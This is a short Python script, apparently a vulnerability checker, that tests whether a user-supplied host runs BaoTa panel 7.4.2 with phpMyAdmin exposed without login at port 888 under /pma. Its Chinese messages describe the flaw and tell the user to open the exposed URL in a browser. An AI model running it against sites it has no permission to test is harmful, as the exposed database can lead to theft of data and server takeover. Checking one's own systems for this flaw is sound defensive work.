import requests
import sys
print("""           .---.               ___                ,---,        ,---,                          
          /. ./|             ,--.'|_            ,--.' |      .'  .' `\                        
      .--'.  ' ;             |  | :,'           |  |  :    ,---.'     \    ,---.              
     /__./ \ : |             :  : ' :           :  :  :    |   |  .`\  |  '   ,'\   ,----._,. 
 .--'.  '   \' .  ,--.--.  .;__,'  /     ,---.  :  |  |,--.:   : |  '  | /   /   | /   /  ' / 
/___/ \ |    ' ' /       \ |  |   |     /     \ |  :  '   ||   ' '  ;  :.   ; ,. :|   :     | 
;   \  \;      :.--.  .-. |:__,'| :    /    / ' |  |   /' :'   | ;  .  |'   | |: :|   | .\  . 
 \   ;  `      | \__\/: . .  '  : |__ .    ' /  '  :  | | ||   | :  |  ''   | .; :.   ; ';  | 
  .   \    .\  ; ," .--.; |  |  | '.'|'   ; :__ |  |  ' | :'   : | /  ; |   :    |'   .   . | 
   \   \   ' \ |/  /  ,.  |  ;  :    ;'   | '.'||  :  :_:,'|   | '` ,/   \   \  /  `---`-'| | 
    :   '  |--";  :   .'   \ |  ,   / |   :    :|  | ,'    ;   :  .'      `----'   .'__/\_: | 
     \   \ ;   |  ,     .-./  ---`-'   \   \  / `--''      |   ,.'                 |   :    : 
      '---"     `--`---'                `----'             '---'                    \   \  /  
                                                                                     `--`-'  by:ghq""")
print("*---改脚本用于检测宝塔面板7.4.2版本的phpmyadmin登录绕过漏洞---*")
print("漏洞简介：2020年8月23日晚间，宝塔官方紧急推送安全更新，修复了一处在7.4.2版本中的高危漏洞，攻击者可利用此漏洞越权访问数据库，甚至获取服务器权限。")
print("漏洞危害：此版本宝塔面板在部署phpmyadmin时，直接部署在http://ip:888/pma/ 路径下，且不需要验证用户名密码直接访问，对数据库安全构成严重威胁，攻击者甚至可以通过数据库获得服务器权限。")
while True:
    user_input = input("请输入要检测的网址(不加端口和协议！！！):")
    host = "http://"+user_input
    

    payload = ":888/pma"
    url = str(host+payload)
    if ("http" in user_input) | (":" in user_input):
        print("不要加协议或端口！！你应该输入例如：www.baidu.com | 192.168.1.203")
    else:
        break
try:
    response = requests.get(url,timeout=5)
except:
    print("超时，请检查网站是否能够正常打开！！")
    sys.exit()
    
if response.status_code == 200:
    print("该网页疑似存在phpmyadmin登录绕过漏洞，请在浏览器输入"+url+"进行查看")
else:  
    print("该网址貌似不存在该漏洞，换个网址检查吧！")
